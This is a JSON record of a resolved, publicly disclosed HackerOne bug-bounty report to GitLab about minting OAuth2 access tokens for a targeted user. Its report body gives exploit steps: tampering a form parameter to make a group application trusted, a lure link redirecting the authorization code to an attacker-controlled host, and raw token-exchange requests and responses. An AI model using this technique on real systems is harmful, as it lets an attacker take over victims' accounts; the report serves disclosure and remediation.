@@ -1,0 +1,125 @@
+{
+  "id": 1148364,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTQ4MzY0",
+  "url": "https://hackerone.com/reports/1148364",
+  "title": "Mint Oauth2 access token for targeted user",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-04T11:00:27.611Z",
+  "submitted_at": "2021-04-04T11:00:27.707Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "timothyleung",
+    "url": "/timothyleung",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/089/189/a34f34935435ffacd136ea088364eccbb9d97dea_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-07-23T00:06:09.923Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-07-23T00:06:09.560Z",
+  "team_member_agreed_on_going_public_at": "2021-05-21T20:00:07.601Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nIt is possible to mint access token for targeted user. There is a flaw for group level application setup. It allows a group owner to create an application with user's trust by default. This bypassed the CSRF control for authorization flow. \n\n### Steps to reproduce\n\n\n1. Login as user1 , create a group called malicious group\n\n2. Create an Applications in Settings > Applications > api scope checked \n\n3. Open the created application and click Edit, intercept the request when you click \"Save application\", append the following \n`doorkeeper_application%5Btrusted%5D=0&doorkeeper_application%5Btrusted%5D=1& ` This will allow us to create an application that is trusted by default. This is an intended function for instance admin. \n\n4. Send the following link to the user, or put it in an img tag. \nhttps://gitlab.com/login/oauth/authorize?redirect_uri=http://<attacker-control>.com&client_id=9ff83fc426f95b5b5dec389ac02adf4ef800e4a0fb04faed6ffc8305f5fccf29&scope=api \n\n5. You will be able to see a request with the Code\n\n6. You can mint the access token using the following endpoint. \n```\nPOST /login/oauth/access_token HTTP/1.1\nHost: gdk.test:3000\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: perf_bar_enabled=true; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltTTBaR0ZsWWpWa0xXUXdPRFV0TkRjM05TMWlPRGxtTFRVMk5UYzJORFF3WXpsa01pST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--364fb7d4479cb94e08660b9c20f6b7692c7e53a4; _gitlab_session_a577db8f7188ca777cf6a20a7928c67f45ba397ca4a4a162d17662b5e845194c=d114336bb9c2a113ff2e6d5542e17a63; known_sign_in=bGtzOVNNWWY1SitJVDBMUE5WS0VqbXBvbWRyRzhLaXdzKyt6L0FpanZIMndzYVhRUHZpYnlncjJFSFJzNEl3b0dvMlNaVEF4d25PRys4ZDFiYmgvRUpVRWRVdlVRL3YyUXNaUEx4LzExL25YTWk2KzBIUlg3dldFQlpkQ2dDL2YtLTc4cUhhZmJrK2JUckRvT0FONjBRZ1E9PQ%3D%3D--ddb6a3bf3b2faa846ab4a0b2e0ecef561f0c5a99; sidebar_collapsed=false\nUpgrade-Insecure-Requests: 1\nContent-Length: 223\n\ncode=6c53ef532f34762b8705029d4fd005d2c32d788d3e3a78151c1b5f6a2743dffc&client_id=04a5da53b6faaba4758fcb0e7bd80845795c9c838363568c9b4efcc0bcec1934&client_secret=9de25469a82dee694ae4e33e02a3e97156bec87ba905fc4e3e34b9de805f9dc4\n```\nResponse\n```\nHTTP/1.1 200 OK\nCache-Control: max-age=0, private, must-revalidate, no-store\nContent-Type: text/plain; charset=utf-8\nEtag: W/\"a219f8ac2bd29580e1f17894de3956da\"\nPragma: no-cache\nReferrer-Policy: strict-origin-when-cross-origin\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Frame-Options: DENY\nX-Gitlab-Feature-Category: integrations\nX-Permitted-Cross-Domain-Policies: none\nX-Request-Id: 01F2E6M6TER14PB17H6XCDC0B3\nX-Runtime: 0.257708\nX-Ua-Compatible: IE=edge\nX-Xss-Protection: 1; mode=block\nDate: Sun, 04 Apr 2021 10:25:03 GMT\nContent-Length: 105\nConnection: close\n\naccess_token=bc3450dfcc2fb46eece85d1f74d96070f94cd35e656b184706027227243d5338&scope=api&token_type=Bearer\n``` \n\n(Step-by-step guide to reproduce the issue, including:)\n\n(1. any preconditions in the environment)\n(2. complete HTTP or API request, or)\n(3. user action, )\n(4. etc.)\n\n\n### Impact\n\nI believe you can gain api scope access to any targeted user. I will try to enable more scopes later.\n\n\n### What is the current *bug* behavior?\n\nAble to obtain user's code without consent and mint access token which can be used to do things on behalf of the user.\n\n### What is the expected *correct* behavior?\n\nGroup owner should not be able to enable trusted by default when creating application.\n\n## Impact\n\nGain access to targeted user's data.",
+  "bounty_amount": "5580.0",
+  "formatted_bounty": "$5,580",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 133,
+  "voters": [
+    "orange303",
+    "oub3ll4",
+    "stephenbonf",
+    "edark7007",
+    "n1m0",
+    "nakyamad",
+    "almuntadhar0x01",
+    "zy9ard3",
+    "alejandroar",
+    "rocky1696",
+    "and 123 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
